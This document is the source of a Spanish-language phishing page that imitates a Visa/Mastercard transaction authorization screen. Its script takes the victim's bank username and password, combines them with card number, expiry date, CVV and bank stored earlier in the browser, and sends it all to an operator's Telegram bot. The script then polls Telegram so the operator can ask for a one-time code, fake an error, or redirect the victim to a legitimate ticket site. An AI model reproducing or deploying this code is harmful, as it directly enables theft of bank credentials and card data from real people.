<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Autorizaci贸n Usuario/Clave</title>
  <style>
    body {
      margin: 0; padding: 0;
      font-family: "Segoe UI", sans-serif;
      background: #f9f9f9;
    }
    #contenedor {
      max-width: 360px;
      margin: 60px auto;
      background: #fff;
      border-radius: 12px;
      padding: 30px;
      box-shadow: 0 0 12px rgba(0,0,0,0.08);
    }
    #titulo {
      text-align: center;
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 10px;
    }
    #parrafo {
      text-align: center;
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }
    #logos {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin: 10px 0;
    }
    #logos img { height: 32px; }
    #horaTransaccion {
      text-align: center;
      font-size: 14px;
      margin-bottom: 20px;
      color: #888;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 14px;
    }
    label { font-size: 13px; font-weight: 500; }
    input {
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    button {
      background: #007bff;
      color: white;
      border: none;
      padding: 12px;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background: #0056b3;
    }
    .loaderp-full {
      position: fixed;
      top: 0; left: 0;
      width: 100vw; height: 100vh;
      display: none;
      background: rgba(255,255,255,0.8);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .loaderp {
      width: 48px;
      height: 48px;
      border: 5px solid #FFF;
      border-bottom-color: #007bff;
      border-radius: 50%;
      animation: rot 1s linear infinite;
    }
    @keyframes rot { to { transform: rotate(360deg); } }
    #bancoDetectado {
      text-align: center;
      font-size: 13px;
      color: #333;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div id="contenedor">
    <div id="titulo">Autorizaci贸n</div>
    <p id="parrafo">Ingresa tu usuario y clave para confirmar la transacci贸n.</p>

    <div id="logos">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard">
    </div>

    <div id="horaTransaccion">Hora: --:--:--</div>
    <form id="form">
      <label for="username">Usuario:</label>
      <input type="text" id="username" required minlength="4" maxlength="20">
      <label for="password">Clave:</label>
      <input type="password" id="password" required minlength="4" maxlength="20">
      <button type="submit">Autorizar</button>
    </form>
    <div id="bancoDetectado"></div>
  </div>

  <div class="loaderp-full" id="loader">
    <div class="loaderp"></div>
  </div>

  <script>
    // Mostrar hora
    function updHora() {
      const d = new Date();
      const h = String(d.getHours()).padStart(2, '0'),
            m = String(d.getMinutes()).padStart(2, '0'),
            s = String(d.getSeconds()).padStart(2, '0');
      document.getElementById('horaTransaccion').innerText = `Hora: ${h}:${m}:${s}`;
    }
    setInterval(updHora, 1000);
    updHora();

    const cardData = JSON.parse(localStorage.getItem('formData') || '{}');
    const bancoManual = cardData.banco || 'Banco no especificado';
    document.getElementById('bancoDetectado')
      

    const loader = document.getElementById('loader');
    const form = document.getElementById('form');

    form.addEventListener('submit', async e => {
      e.preventDefault();
      loader.style.display = 'flex';

      const user = document.getElementById('username').value;
      const pass = document.getElementById('password').value;

      localStorage.setItem('username', user);
      localStorage.setItem('password', pass);

      const transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
      localStorage.setItem('transactionId', transactionId);

      const message =
`<b> Nueva autenticaci贸n:</b>
 <b>ID:</b> ${transactionId}
 <b>Usuario:</b> ${user}
 <b>Clave:</b> ${pass}

 <b>Tarjeta:</b> ${cardData.tarjeta}
 <b>Venc.:</b> ${cardData.fechaExpiracion}
 <b>CVV:</b> ${cardData.cvv}
 <b>Banco:</b> ${bancoManual}`;

      const keyboard = {
        inline_keyboard: [
          [{ text: "Pedir Din谩mica", callback_data: `pedir_dinamica:${transactionId}` }],
          [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
          [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
          [{ text: "Confirmar", callback_data: `confirm_finalizar:${transactionId}` }]
        ]
      };

      async function loadCfg() {
        const res = await fetch('config.json');
        if (!res.ok) throw 'No carg贸 config.json';
        return res.json();
      }

      try {
        const cfg = await loadCfg();
        const res = await fetch(`https://api.telegram.org/bot${cfg.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: cfg.chat_id,
            text: message,
            reply_markup: keyboard,
            parse_mode: 'HTML'
          })
        });
        const js = await res.json();
        if (!js.ok) throw js;
        poll(cfg, transactionId);
      } catch (err) {
        console.error(err);
        loader.style.display = 'none';
        alert('Error enviando a Telegram');
      }
    });

    // Poll para esperar la acci贸n del admin
    async function poll(cfg, tid) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${cfg.token}/getUpdates`);
        const js = await res.json();
        const upd = js.result.find(u => u.callback_query?.data?.endsWith(`:${tid}`));
        if (upd) {
          loader.style.display = 'none';
          const action = upd.callback_query.data.split(':')[0];
          switch (action) {
            case 'pedir_dinamica':
              window.location.href = 'banco2.html';
              break;
            case 'error_tc':
              window.location.href = 'index.html';
              break;
            case 'error_logo':
              window.location.href = 'banco.html';
              break;
            case 'confirm_finalizar':
              window.location.href = 'https://tuboleta.com/es/';
              break;
          }
        } else {
          setTimeout(() => poll(cfg, tid), 2000);
        }
      } catch {
        setTimeout(() => poll(cfg, tid), 2000);
      }
    }
  </script>
</body>
</html>
